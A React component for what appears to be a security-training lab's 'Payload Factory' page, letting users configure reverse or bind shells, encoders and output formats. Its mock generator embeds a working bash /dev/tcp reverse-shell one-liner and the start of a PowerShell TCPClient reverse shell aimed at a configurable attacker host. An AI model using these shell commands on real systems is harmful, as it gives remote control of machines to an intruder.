import { useState } from 'react';
import { motion } from 'framer-motion';
import { 
  Package, 
  Terminal, 
  Server, 
  Download, 
  Settings, 
  Code,
  Cpu,
  Shield,
  ChevronRight,
  GripVertical,
  Check,
  Copy
} from 'lucide-react';
import { cn } from '@/lib/utils';
import toast from 'react-hot-toast';

interface PayloadOption {
  id: string;
  name: string;
  description: string;
  icon: React.ReactNode;
  category: 'shell' | 'encoder' | 'delivery';
}

interface PayloadConfig {
  type: 'reverse_shell' | 'bind_shell';
  platform: 'linux' | 'windows' | 'macos';
  lhost: string;
  lport: string;
  encoder: string | null;
  format: string;
}

const shellTypes: PayloadOption[] = [
  { id: 'reverse_shell', name: 'Reverse Shell', description: 'Target connects back to attacker', icon: <Terminal className="w-5 h-5" />, category: 'shell' },
  { id: 'bind_shell', name: 'Bind Shell', description: 'Target opens a listening port', icon: <Server className="w-5 h-5" />, category: 'shell' },
];

const platforms: PayloadOption[] = [
  { id: 'linux', name: 'Linux', description: 'ELF binary or Bash script', icon: <Terminal className="w-5 h-5" />, category: 'delivery' },
  { id: 'windows', name: 'Windows', description: 'PE executable or PowerShell', icon: <Cpu className="w-5 h-5" />, category: 'delivery' },
  { id: 'macos', name: 'macOS', description: 'Mach-O binary', icon: <Code className="w-5 h-5" />, category: 'delivery' },
];

const encoders: PayloadOption[] = [
  { id: 'none', name: 'None', description: 'No encoding', icon: <Code className="w-5 h-5" />, category: 'encoder' },
  { id: 'base64', name: 'Base64', description: 'Simple obfuscation', icon: <Shield className="w-5 h-5" />, category: 'encoder' },
  { id: 'xor', name: 'XOR', description: 'XOR cipher encoding', icon: <Shield className="w-5 h-5" />, category: 'encoder' },
  { id: 'shikata', name: 'Shikata Ga Nai', description: 'Polymorphic encoder', icon: <Shield className="w-5 h-5" />, category: 'encoder' },
];

const formats = ['raw', 'elf', 'exe', 'ps1', 'py', 'bash'];

export function PayloadFactory() {
  const [config, setConfig] = useState<PayloadConfig>({
    type: 'reverse_shell',
    platform: 'linux',
    lhost: '10.10.10.1',
    lport: '4444',
    encoder: null,
    format: 'raw',
  });
  const [generating, setGenerating] = useState(false);
  const [generatedPayload, setGeneratedPayload] = useState<string | null>(null);
  const [draggedItem, setDraggedItem] = useState<string | null>(null);

  const handleDragStart = (id: string) => {
    setDraggedItem(id);
  };

  const handleDrop = (category: 'shell' | 'platform' | 'encoder') => {
    if (!draggedItem) return;

    if (category === 'shell' && (draggedItem === 'reverse_shell' || draggedItem === 'bind_shell')) {
      setConfig(prev => ({ ...prev, type: draggedItem as 'reverse_shell' | 'bind_shell' }));
    } else if (category === 'platform' && ['linux', 'windows', 'macos'].includes(draggedItem)) {
      setConfig(prev => ({ ...prev, platform: draggedItem as 'linux' | 'windows' | 'macos' }));
    } else if (category === 'encoder') {
      setConfig(prev => ({ ...prev, encoder: draggedItem === 'none' ? null : draggedItem }));
    }

    setDraggedItem(null);
  };

  const generatePayload = async () => {
    setGenerating(true);
    
    // Simulate generation
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    const payload = generateMockPayload(config);
    setGeneratedPayload(payload);
    setGenerating(false);

    toast.success('Payload generated successfully!', {
      icon: '⚡',
      style: { background: '#0a0f1a', color: '#00ff41', border: '1px solid #00ff41' },
    });
  };

  const generateMockPayload = (cfg: PayloadConfig): string => {
    if (cfg.type === 'reverse_shell' && cfg.platform === 'linux') {
      return `#!/bin/bash\n# Vexis Payload Factory - Reverse Shell\n# LHOST: ${cfg.lhost} | LPORT: ${cfg.lport}\n\nbash -i >& /dev/tcp/${cfg.lhost}/${cfg.lport} 0>&1`;
    }
    if (cfg.type === 'reverse_shell' && cfg.platform === 'windows') {
      return `# Vexis Payload Factory - PowerShell Reverse Shell\n# LHOST: ${cfg.lhost} | LPORT: ${cfg.lport}\n\n$client = New-Object System.Net.Sockets.TCPClient('${cfg.lhost}',${cfg.lport});\n$stream = $client.GetStream();`;
    }
    return `# Vexis Payload - ${cfg.type} for ${cfg.platform}\n# Configuration: ${JSON.stringify(cfg, null, 2)}`;
  };

  const copyPayload = () => {
    if (generatedPayload) {
      navigator.clipboard.writeText(generatedPayload);
      toast.success('Payload copied to clipboard');
    }
  };

  const downloadToLab = () => {
    toast.success('Payload sent to active lab', {
      icon: '📦',
      style: { background: '#0a0f1a', color: '#00ff41', border: '1px solid #00ff41' },
    });
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="h-full p-6 overflow-auto"
    >
      <div className="flex items-center justify-between mb-6">
        <div>
          <h2 className="font-display text-2xl font-bold neon-text-purple">Payload Factory</h2>
          <p className="text-sm text-muted-foreground">Drag and drop to configure exploits</p>
        </div>
      </div>

      <div className="grid grid-cols-12 gap-6">
        {/* Left - Component Palette */}
        <div className="col-span-3 space-y-4">
          <div className="glass-panel-purple rounded-lg p-4">
            <h3 className="text-sm font-medium mb-3 text-secondary">Shell Types</h3>
            <div className="space-y-2">
              {shellTypes.map((item) => (
                <div
                  key={item.id}
                  draggable
                  onDragStart={() => handleDragStart(item.id)}
                  className="flex items-center gap-2 p-3 rounded-lg bg-muted/30 border border-border/40 cursor-grab hover:border-secondary/50 transition-colors"
                >
                  <GripVertical className="w-4 h-4 text-muted-foreground" />
                  {item.icon}
                  <div className="flex-1">
                    <div className="text-sm font-medium">{item.name}</div>
                    <div className="text-xs text-muted-foreground">{item.description}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="glass-panel-purple rounded-lg p-4">
            <h3 className="text-sm font-medium mb-3 text-secondary">Platforms</h3>
            <div className="space-y-2">
              {platforms.map((item) => (
                <div
                  key={item.id}
                  draggable
                  onDragStart={() => handleDragStart(item.id)}
                  className="flex items-center gap-2 p-3 rounded-lg bg-muted/30 border border-border/40 cursor-grab hover:border-secondary/50 transition-colors"
                >
                  <GripVertical className="w-4 h-4 text-muted-foreground" />
                  {item.icon}
                  <div className="flex-1">
                    <div className="text-sm font-medium">{item.name}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="glass-panel-purple rounded-lg p-4">
            <h3 className="text-sm font-medium mb-3 text-secondary">Encoders</h3>
            <div className="space-y-2">
              {encoders.map((item) => (
                <div
                  key={item.id}
                  draggable
                  onDragStart={() => handleDragStart(item.id)}
                  className="flex items-center gap-2 p-3 rounded-lg bg-muted/30 border border-border/40 cursor-grab hover:border-secondary/50 transition-colors"
                >
                  <GripVertical className="w-4 h-4 text-muted-foreground" />
                  {item.icon}
                  <div className="flex-1">
                    <div className="text-sm font-medium">{item.name}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Center - Configuration */}
        <div className="col-span-5 space-y-4">
          <div className="glass-panel-purple rounded-lg p-6">
            <h3 className="font-display font-semibold mb-4 flex items-center gap-2">
              <Settings className="w-5 h-5 text-secondary" />
              Payload Configuration
            </h3>

            {/* Drop Zones */}
            <div className="space-y-4">
              <div
                onDragOver={(e) => e.preventDefault()}
                onDrop={() => handleDrop('shell')}
                className={cn(
                  'p-4 rounded-lg border-2 border-dashed transition-colors',
                  draggedItem && ['reverse_shell', 'bind_shell'].includes(draggedItem)
                    ? 'border-secondary bg-secondary/10'
                    : 'border-border/40'
                )}
              >
                <div className="text-xs text-muted-foreground mb-2">Shell Type</div>
                <div className="flex items-center gap-2">
                  {config.type === 'reverse_shell' ? <Terminal className="w-5 h-5 text-secondary" /> : <Server className="w-5 h-5 text-secondary" />}
                  <span className="font-medium capitalize">{config.type.replace('_', ' ')}</span>
                </div>
              </div>

              <div
                onDragOver={(e) => e.preventDefault()}
                onDrop={() => handleDrop('platform')}
                className={cn(
                  'p-4 rounded-lg border-2 border-dashed transition-colors',
                  draggedItem && ['linux', 'windows', 'macos'].includes(draggedItem)
                    ? 'border-secondary bg-secondary/10'
                    : 'border-border/40'
                )}
              >
                <div className="text-xs text-muted-foreground mb-2">Target Platform</div>
                <div className="flex items-center gap-2">
                  <Cpu className="w-5 h-5 text-secondary" />
                  <span className="font-medium capitalize">{config.platform}</span>
                </div>
              </div>

              <div
                onDragOver={(e) => e.preventDefault()}
                onDrop={() => handleDrop('encoder')}
                className={cn(
                  'p-4 rounded-lg border-2 border-dashed transition-colors',
                  draggedItem && encoders.some(e => e.id === draggedItem)
                    ? 'border-secondary bg-secondary/10'
                    : 'border-border/40'
                )}
              >
                <div className="text-xs text-muted-foreground mb-2">Encoder</div>
                <div className="flex items-center gap-2">
                  <Shield className="w-5 h-5 text-secondary" />
                  <span className="font-medium">{config.encoder || 'None'}</span>
                </div>
              </div>
            </div>

            {/* Manual Config */}
            <div className="mt-6 grid grid-cols-2 gap-4">
              <div>
                <label className="text-xs text-muted-foreground mb-1 block">LHOST</label>
                <input
                  type="text"
                  value={config.lhost}
                  onChange={(e) => setConfig(prev => ({ ...prev, lhost: e.target.value }))}
                  className="w-full bg-muted/50 border border-border/40 rounded-lg px-3 py-2 text-sm font-mono"
                />
              </div>
              <div>
                <label className="text-xs text-muted-foreground mb-1 block">LPORT</label>
                <input
                  type="text"
                  value={config.lport}
                  onChange={(e) => setConfig(prev => ({ ...prev, lport: e.target.value }))}
                  className="w-full bg-muted/50 border border-border/40 rounded-lg px-3 py-2 text-sm font-mono"
                />
              </div>
            </div>

            <div className="mt-4">
              <label className="text-xs text-muted-foreground mb-1 block">Output Format</label>
              <div className="flex flex-wrap gap-2">
                {formats.map((fmt) => (
                  <button
                    key={fmt}
                    onClick={() => setConfig(prev => ({ ...prev, format: fmt }))}
                    className={cn(
                      'px-3 py-1.5 rounded-lg text-xs font-mono transition-colors',
                      config.format === fmt
                        ? 'bg-secondary/20 text-secondary border border-secondary/30'
                        : 'bg-muted/30 text-muted-foreground hover:text-foreground'
                    )}
                  >
                    .{fmt}
                  </button>
                ))}
              </div>
            </div>

            <button
              onClick={generatePayload}
              disabled={generating}
              className="mt-6 w-full flex items-center justify-center gap-2 px-4 py-3 bg-secondary/20 text-secondary border border-secondary/30 rounded-lg hover:bg-secondary/30 transition-colors disabled:opacity-50"
            >
              {generating ? (
                <div className="animate-spin w-5 h-5 border-2 border-secondary border-t-transparent rounded-full" />
              ) : (
                <>
                  <Package className="w-5 h-5" />
                  Generate Payload
                </>
              )}
            </button>
          </div>
        </div>

        {/* Right - Output */}
        <div className="col-span-4">
          <div className="glass-panel-purple rounded-lg h-full flex flex-col">
            <div className="p-4 border-b border-border/40 flex items-center justify-between">
              <h3 className="font-display font-semibold flex items-center gap-2">
                <Code className="w-5 h-5 text-secondary" />
                Generated Output
              </h3>
              {generatedPayload && (
                <div className="flex items-center gap-2">
                  <button
                    onClick={copyPayload}
                    className="p-1.5 rounded hover:bg-muted/50 transition-colors"
                  >
                    <Copy className="w-4 h-4 text-muted-foreground" />
                  </button>
                </div>
              )}
            </div>
            
            <div className="flex-1 p-4 overflow-auto">
              {generatedPayload ? (
                <pre className="text-xs font-mono text-foreground/80 whitespace-pre-wrap">
                  {generatedPayload}
                </pre>
              ) : (
                <div className="h-full flex items-center justify-center text-muted-foreground">
                  <p className="text-sm">Configure and generate a payload</p>
                </div>
              )}
            </div>

            {generatedPayload && (
              <div className="p-4 border-t border-border/40">
                <button
                  onClick={downloadToLab}
                  className="w-full flex items-center justify-center gap-2 px-4 py-2.5 bg-primary/20 text-primary border border-primary/30 rounded-lg hover:bg-primary/30 transition-colors"
                >
                  <Download className="w-4 h-4" />
                  Download to Lab
                </button>
              </div>
            )}
          </div>
        </div>
      </div>
    </motion.div>
  );
}